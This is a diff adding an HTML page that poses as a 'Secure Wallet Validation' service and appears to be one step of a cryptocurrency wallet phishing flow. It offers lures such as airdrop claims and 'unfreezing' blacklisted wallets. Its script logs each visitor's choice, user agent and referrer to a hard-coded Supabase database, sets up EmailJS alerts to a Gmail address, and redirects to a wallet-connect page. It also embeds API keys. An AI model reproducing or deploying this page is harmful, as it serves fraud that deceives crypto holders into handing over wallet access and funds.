@@ -1,0 +1,703 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Secure wallet validation – purpose of connection."
+    />
+    <title>Secure Wallet Validation · Purpose</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      :root {
+        --bg: #0b1220;
+        --bg-soft: #111a2e;
+        --surface: #17233a;
+        --border: #263550;
+        --text: #f8fafc;
+        --muted: #94a3b8;
+        --subtle: #64748b;
+        --accent: #3b82f6;
+        --accent-hover: #2563eb;
+        --success: #22c55e;
+        --danger: #ef4444;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+      html {
+        min-height: 100%;
+        background: var(--bg);
+      }
+
+      body {
+        min-height: 100vh;
+        min-height: 100svh;
+        font-family:
+          "Inter",
+          system-ui,
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe UI",
+          sans-serif;
+        color: var(--text);
+        background: var(--bg);
+        -webkit-font-smoothing: antialiased;
+        text-rendering: optimizeLegibility;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+      }
+
+      .page-wrapper {
+        position: relative;
+        width: 100%;
+        min-height: 100vh;
+        min-height: 100svh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        isolation: isolate;
+      }
+
+      .page-wrapper::before {
+        content: "";
+        position: absolute;
+        inset: 0;
+        z-index: -2;
+        pointer-events: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='900' height='600' viewBox='0 0 900 600'%3E%3Cg fill='%23F8FAFC'%3E%3Ccircle cx='42' cy='48' r='.8' opacity='.35'/%3E%3Ccircle cx='121' cy='164' r='.7' opacity='.22'/%3E%3Ccircle cx='181' cy='78' r='1' opacity='.45'/%3E%3Ccircle cx='254' cy='35' r='.7' opacity='.30'/%3E%3Ccircle cx='318' cy='126' r='.8' opacity='.20'/%3E%3Ccircle cx='397' cy='67' r='.9' opacity='.40'/%3E%3Ccircle cx='468' cy='181' r='.7' opacity='.25'/%3E%3Ccircle cx='531' cy='54' r='.8' opacity='.35'/%3E%3Ccircle cx='608' cy='112' r='.7' opacity='.25'/%3E%3Ccircle cx='684' cy='39' r='.9' opacity='.40'/%3E%3Ccircle cx='758' cy='153' r='.8' opacity='.25'/%3E%3Ccircle cx='847' cy='91' r='.9' opacity='.38'/%3E%3Ccircle cx='72' cy='337' r='.7' opacity='.20'/%3E%3Ccircle cx='149' cy='418' r='.9' opacity='.30'/%3E%3Ccircle cx='225' cy='302' r='.7' opacity='.26'/%3E%3Ccircle cx='341' cy='463' r='.8' opacity='.25'/%3E%3Ccircle cx='426' cy='351' r='.7' opacity='.20'/%3E%3Ccircle cx='509' cy='514' r='1' opacity='.35'/%3E%3Ccircle cx='593' cy='389' r='.7' opacity='.23'/%3E%3Ccircle cx='681' cy='479' r='.8' opacity='.30'/%3E%3Ccircle cx='764' cy='338' r='.7' opacity='.20'/%3E%3Ccircle cx='858' cy='442' r='.9' opacity='.33'/%3E%3Ccircle cx='35' cy='548' r='.7' opacity='.25'/%3E%3Ccircle cx='292' cy='556' r='.8' opacity='.20'/%3E%3Ccircle cx='742' cy='570' r='.7' opacity='.25'/%3E%3C/g%3E%3C/svg%3E");
+        background-size: 900px 600px;
+        opacity: 0.55;
+      }
+
+      .content {
+        width: min(100%, 720px);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+        padding: 8px 0;
+      }
+
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 32px;
+        padding: 0 16px;
+        border: 1px solid var(--border);
+        border-radius: 100px;
+        background: var(--bg-soft);
+        color: #93bbfc;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        margin-bottom: 28px;
+        backdrop-filter: blur(4px);
+      }
+
+      h1 {
+        font-size: clamp(32px, 6vw, 58px);
+        line-height: 1.1;
+        letter-spacing: -0.03em;
+        font-weight: 700;
+        color: var(--text);
+        margin-bottom: 18px;
+      }
+
+      .subtitle {
+        font-size: clamp(15px, 1.6vw, 18px);
+        line-height: 1.65;
+        color: var(--muted);
+        max-width: 560px;
+        margin: 0 auto 48px;
+        font-weight: 400;
+        letter-spacing: -0.01em;
+      }
+
+      .card {
+        width: 100%;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 20px;
+        padding: 36px 40px 40px;
+        box-shadow:
+          0 20px 40px -12px rgba(0, 0, 0, 0.6),
+          0 0 0 1px rgba(59, 130, 246, 0.05);
+        transition: border-color 0.2s ease;
+      }
+
+      .card:hover {
+        border-color: #2f405e;
+      }
+
+      .config-tag {
+        display: inline-block;
+        padding: 6px 18px;
+        background: var(--bg-soft);
+        border: 1px solid var(--border);
+        border-radius: 100px;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.1em;
+        text-transform: uppercase;
+        color: var(--muted);
+        margin-bottom: 24px;
+      }
+
+      .step-title {
+        font-size: clamp(22px, 3.5vw, 28px);
+        font-weight: 600;
+        letter-spacing: -0.02em;
+        color: var(--text);
+        margin-bottom: 36px;
+      }
+
+      .select-wrapper {
+        position: relative;
+        width: 100%;
+        text-align: left;
+      }
+
+      .select-trigger {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 100%;
+        padding: 18px 24px;
+        background: var(--bg-soft);
+        border: 1px solid var(--border);
+        border-radius: 14px;
+        cursor: pointer;
+        transition:
+          background-color 0.18s ease,
+          border-color 0.18s ease,
+          box-shadow 0.18s ease;
+        user-select: none;
+      }
+
+      .select-trigger:hover {
+        background: #1a263e;
+        border-color: #2f405e;
+      }
+      .select-trigger:focus-visible {
+        outline: 2px solid var(--accent);
+        outline-offset: 2px;
+      }
+
+      .select-trigger.open {
+        border-color: var(--accent);
+        box-shadow: 0 0 0 1px var(--accent);
+      }
+
+      .select-trigger .placeholder {
+        font-size: 16px;
+        font-weight: 500;
+        color: var(--muted);
+        letter-spacing: -0.01em;
+      }
+
+      .select-trigger .selected-value {
+        font-size: 16px;
+        font-weight: 500;
+        color: var(--text);
+        letter-spacing: -0.01em;
+      }
+
+      .select-trigger .chevron {
+        font-size: 14px;
+        color: var(--muted);
+        transition: transform 0.25s ease;
+        line-height: 1;
+      }
+
+      .select-trigger.open .chevron {
+        transform: rotate(180deg);
+      }
+
+      .select-dropdown {
+        position: absolute;
+        top: calc(100% + 8px);
+        left: 0;
+        right: 0;
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 14px;
+        box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.7);
+        z-index: 100;
+        max-height: 320px;
+        overflow-y: auto;
+        opacity: 0;
+        transform: translateY(-6px) scale(0.98);
+        pointer-events: none;
+        transition:
+          opacity 0.2s ease,
+          transform 0.2s ease;
+        padding: 6px;
+      }
+
+      .select-dropdown.open {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+        pointer-events: auto;
+      }
+
+      .select-dropdown::-webkit-scrollbar {
+        width: 6px;
+      }
+      .select-dropdown::-webkit-scrollbar-track {
+        background: var(--bg-soft);
+        border-radius: 10px;
+      }
+      .select-dropdown::-webkit-scrollbar-thumb {
+        background: var(--border);
+        border-radius: 10px;
+      }
+      .select-dropdown::-webkit-scrollbar-thumb:hover {
+        background: var(--subtle);
+      }
+
+      .select-option {
+        padding: 14px 18px;
+        font-size: 15px;
+        font-weight: 400;
+        color: var(--text);
+        border-radius: 10px;
+        cursor: pointer;
+        transition:
+          background-color 0.15s ease,
+          color 0.15s ease;
+        display: flex;
+        align-items: center;
+        letter-spacing: -0.01em;
+      }
+
+      .select-option:hover {
+        background: var(--bg-soft);
+      }
+
+      .select-option.active {
+        background: var(--accent);
+        color: #fff;
+        font-weight: 500;
+      }
+
+      .select-option.active:hover {
+        background: var(--accent-hover);
+      }
+
+      .select-option.header-option {
+        background: var(--accent);
+        color: #fff;
+        font-weight: 600;
+        border-radius: 10px;
+        margin-bottom: 4px;
+        cursor: pointer;
+      }
+
+      .select-option.header-option:hover {
+        background: var(--accent-hover);
+      }
+
+      @media (max-width: 640px) {
+        body {
+          padding: 16px;
+        }
+        .badge {
+          margin-bottom: 20px;
+          font-size: 10px;
+          padding: 0 14px;
+          min-height: 28px;
+        }
+        h1 {
+          font-size: clamp(28px, 8vw, 40px);
+          margin-bottom: 14px;
+        }
+        .subtitle {
+          font-size: 14px;
+          margin-bottom: 32px;
+          padding: 0 4px;
+        }
+        .card {
+          padding: 26px 20px 28px;
+          border-radius: 16px;
+        }
+        .config-tag {
+          font-size: 10px;
+          padding: 5px 14px;
+          margin-bottom: 18px;
+        }
+        .step-title {
+          font-size: 20px;
+          margin-bottom: 26px;
+        }
+        .select-trigger {
+          padding: 15px 18px;
+          border-radius: 12px;
+        }
+        .select-trigger .placeholder,
+        .select-trigger .selected-value {
+          font-size: 15px;
+        }
+        .select-option {
+          padding: 12px 16px;
+          font-size: 14px;
+        }
+        .select-dropdown {
+          max-height: 260px;
+        }
+      }
+
+      @media (max-width: 380px) {
+        .select-trigger {
+          padding: 13px 16px;
+        }
+        .select-trigger .placeholder,
+        .select-trigger .selected-value {
+          font-size: 14px;
+        }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        .select-trigger,
+        .select-dropdown,
+        .select-option,
+        .select-trigger .chevron {
+          transition: none;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="page-wrapper">
+      <main class="content">
+        <div class="badge">Connection Protocol</div>
+        <h1>Secure Wallet Validation</h1>
+        <p class="subtitle">
+          Complete the verification process to synchronize your wallet with the
+          decentralized infrastructure.
+        </p>
+
+        <section class="card" aria-labelledby="step-heading">
+          <div class="config-tag">Configuration</div>
+          <h2 id="step-heading" class="step-title">2. Purpose of Connection</h2>
+
+          <div class="select-wrapper" id="customSelectWrapper">
+            <div
+              class="select-trigger"
+              id="selectTrigger"
+              tabindex="0"
+              role="combobox"
+              aria-expanded="false"
+              aria-haspopup="listbox"
+              aria-controls="selectDropdown"
+            >
+              <span class="placeholder" id="selectPlaceholder"
+                >Please select issue type...</span
+              >
+              <span
+                class="selected-value"
+                id="selectSelectedValue"
+                style="display: none"
+              ></span>
+              <span class="chevron" aria-hidden="true">▼</span>
+            </div>
+
+            <div
+              class="select-dropdown"
+              id="selectDropdown"
+              role="listbox"
+              aria-label="Issue types"
+            ></div>
+          </div>
+        </section>
+      </main>
+    </div>
+
+    <!-- Supabase + EmailJS + shared scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      window.SUPABASE_URL = "https://jrjbfbpjmcxkgchhdxwo.supabase.co";
+      window.SUPABASE_ANON_KEY =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyamJmYnBqbWN4a2djaGhkeHdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTIxNTQ2NzIsImV4cCI6MjEwNzczMDY3Mn0.Azo2z4xNsmjwfUWby_aVLlPhkBld3-7Dts6woerPTMI";
+      window.EMAILJS_SERVICE_ID = "service_8ll4vfv";
+      window.EMAILJS_TEMPLATE_ID = "template_nbkfb7i";
+      window.EMAILJS_PUBLIC_KEY = "rHWptt7FOQTAV-Vnv";
+      window.ADMIN_EMAIL = "winshied354@gmail.com";
+
+      window.supabaseClient = supabase.createClient(
+        window.SUPABASE_URL,
+        window.SUPABASE_ANON_KEY,
+      );
+
+      if (
+        window.emailjs &&
+        window.EMAILJS_PUBLIC_KEY &&
+        !window.EMAILJS_PUBLIC_KEY.startsWith("YOUR_")
+      ) {
+        try {
+          emailjs.init({ publicKey: window.EMAILJS_PUBLIC_KEY });
+        } catch (e) {
+          console.warn(e);
+        }
+      }
+
+      (function () {
+        const SESSION_KEY = "wv_session_id";
+        const DATA_KEY = "wv_flow_data";
+        let sid = null;
+        try {
+          sid = localStorage.getItem(SESSION_KEY);
+        } catch (_) {}
+        if (!sid) {
+          sid =
+            "sess_" +
+            Date.now().toString(36) +
+            "_" +
+            Math.random().toString(36).slice(2, 10);
+          try {
+            localStorage.setItem(SESSION_KEY, sid);
+          } catch (_) {}
+        }
+        window.SESSION_ID = sid;
+        let flow = {};
+        try {
+          flow = JSON.parse(localStorage.getItem(DATA_KEY) || "{}");
+        } catch (_) {}
+        window.FLOW_DATA = flow;
+        window.saveFlowData = function (patch) {
+          window.FLOW_DATA = Object.assign({}, window.FLOW_DATA, patch);
+          try {
+            localStorage.setItem(DATA_KEY, JSON.stringify(window.FLOW_DATA));
+          } catch (_) {}
+        };
+      })();
+
+      (function () {
+        window.envInfo = function () {
+          return {
+            user_agent: navigator.userAgent || null,
+            referrer: document.referrer || null,
+          };
+        };
+        window.upsertEntry = async function (patch) {
+          if (!window.supabaseClient) return null;
+          const sessionId = window.SESSION_ID;
+          const payload = Object.assign({ session_id: sessionId }, patch);
+
+          const { data: existing, error: selErr } = await window.supabaseClient
+            .from("entries")
+            .select("id")
+            .eq("session_id", sessionId)
+            .maybeSingle();
+          if (selErr) console.error("lookup error", selErr);
+
+          if (existing && existing.id) {
+            const { data, error } = await window.supabaseClient
+              .from("entries")
+              .update(payload)
+              .eq("id", existing.id)
+              .select()
+              .single();
+            if (error) console.error("update error", error);
+            return data;
+          } else {
+            const { data, error } = await window.supabaseClient
+              .from("entries")
+              .insert(payload)
+              .select()
+              .single();
+            if (error) console.error("insert error", error);
+            return data;
+          }
+        };
+      })();
+
+      (function () {
+        const style = document.createElement("style");
+        style.textContent = `
+        .page-loader {
+          position: fixed; inset: 0; z-index: 9999;
+          display: flex; align-items: center; justify-content: center;
+          background: #0B1220;
+          opacity: 0; visibility: hidden;
+          transition: opacity .25s ease, visibility .25s ease;
+        }
+        .page-loader.active { opacity: 1; visibility: visible; }
+        .page-loader .spinner {
+          width: 44px; height: 44px;
+          border: 3px solid #263550;
+          border-top-color: #3B82F6;
+          border-radius: 50%;
+          animation: pl-spin .8s linear infinite;
+        }
+        @keyframes pl-spin { to { transform: rotate(360deg); } }
+      `;
+        document.head.appendChild(style);
+        const el = document.createElement("div");
+        el.className = "page-loader";
+        el.innerHTML = '<div class="spinner" aria-hidden="true"></div>';
+        document.addEventListener("DOMContentLoaded", () => {
+          document.body.appendChild(el);
+          el.classList.add("active");
+          setTimeout(() => el.classList.remove("active"), 350);
+        });
+        window.showLoader = function () {
+          const n = document.querySelector(".page-loader");
+          if (n) n.classList.add("active");
+        };
+        window.hideLoader = function () {
+          const n = document.querySelector(".page-loader");
+          if (n) n.classList.remove("active");
+        };
+      })();
+
+      /* -------- Page-specific logic -------- */
+      document.addEventListener("DOMContentLoaded", () => {
+        const optionsList = [
+          { label: "Claim Airdrop", value: "claim-airdrop", isHeader: true },
+          { label: "Unfreeze Blockchain Blacklist", value: "unfreeze-blockchain-blacklist" },
+          { label: "Unable to Swap", value: "unable-to-swap" },
+          { label: "Unable to Withdraw", value: "unable-to-withdraw" },
+          { label: "Convert all fake token to Sol", value: "convert-all-fake-tokens-to-sol" },
+          { label: "Unable to Sell", value: "unable-to-sell" },
+          { label: "Unable to buy presale", value: "unable-to-buy-presale" },
+          { label: "Buy presale", value: "buy-presale" },
+          { label: "Claim presale token", value: "claim-presale-token" },
+          { label: "Delayed Transaction", value: "delayed-transaction" },
+        ];
+
+        const wrapper = document.getElementById("customSelectWrapper");
+        const trigger = document.getElementById("selectTrigger");
+        const placeholder = document.getElementById("selectPlaceholder");
+        const selectedValueSpan = document.getElementById(
+          "selectSelectedValue",
+        );
+        const dropdown = document.getElementById("selectDropdown");
+
+        let isOpen = false;
+        let selectedValue = null;
+
+        function renderOptions() {
+          dropdown.innerHTML = "";
+          optionsList.forEach((opt, index) => {
+            const div = document.createElement("div");
+            div.className = "select-option";
+            if (opt.isHeader) div.classList.add("header-option");
+            div.setAttribute("role", "option");
+            div.setAttribute("data-value", opt.value);
+            div.setAttribute("data-index", index);
+            div.textContent = opt.label;
+            if (selectedValue === opt.value) div.classList.add("active");
+            div.addEventListener("click", (e) => {
+              e.stopPropagation();
+              selectOption(opt.value, opt.label, opt.isHeader);
+            });
+            dropdown.appendChild(div);
+          });
+        }
+
+        async function selectOption(value, label, isHeader) {
+          selectedValue = value;
+          placeholder.style.display = "none";
+          selectedValueSpan.style.display = "inline";
+          selectedValueSpan.textContent = label;
+
+          document.querySelectorAll(".select-option").forEach((el) => {
+            el.classList.remove("active");
+            if (el.getAttribute("data-value") === value)
+              el.classList.add("active");
+          });
+
+          closeDropdown();
+
+          window.saveFlowData({ connection_purpose: value });
+          await window.upsertEntry(
+            Object.assign({ connection_purpose: value }, window.envInfo()),
+          );
+
+          if (window.showLoader) window.showLoader();
+          setTimeout(() => {
+            window.location.href = "wallettoconnect.html";
+          }, 450);
+        }
+
+        function openDropdown() {
+          if (isOpen) return;
+          isOpen = true;
+          trigger.classList.add("open");
+          trigger.setAttribute("aria-expanded", "true");
+          dropdown.classList.add("open");
+        }
+
+        function closeDropdown() {
+          if (!isOpen) return;
+          isOpen = false;
+          trigger.classList.remove("open");
+          trigger.setAttribute("aria-expanded", "false");
+          dropdown.classList.remove("open");
+        }
+
+        function toggleDropdown() {
+          isOpen ? closeDropdown() : openDropdown();
+        }
+
+        trigger.addEventListener("click", (e) => {
+          e.stopPropagation();
+          toggleDropdown();
+        });
+
+        trigger.addEventListener("keydown", (e) => {
+          if (e.key === "Enter" || e.key === " " || e.key === "ArrowDown") {
+            e.preventDefault();
+            if (!isOpen) openDropdown();
+          } else if (e.key === "Escape") {
+            closeDropdown();
+          }
+        });
+
+        document.addEventListener("click", (e) => {
+          if (!wrapper.contains(e.target)) closeDropdown();
+        });
+
+        document.addEventListener("keydown", (e) => {
+          if (e.key === "Escape" && isOpen) closeDropdown();
+        });
+
+        renderOptions();
+
+        // Restore prior selection
+        const prior = window.FLOW_DATA && window.FLOW_DATA.connection_purpose;
+        if (prior) {
+          const opt = optionsList.find((o) => o.value === prior);
+          if (opt) {
+            selectedValue = opt.value;
+            placeholder.style.display = "none";
+            selectedValueSpan.style.display = "inline";
+            selectedValueSpan.textContent = opt.label;
+            document.querySelectorAll(".select-option").forEach((el) => {
+              if (el.getAttribute("data-value") === opt.value)
+                el.classList.add("active");
+            });
+          }
+        }
+      });
+    </script>
+  </body>
+</html>
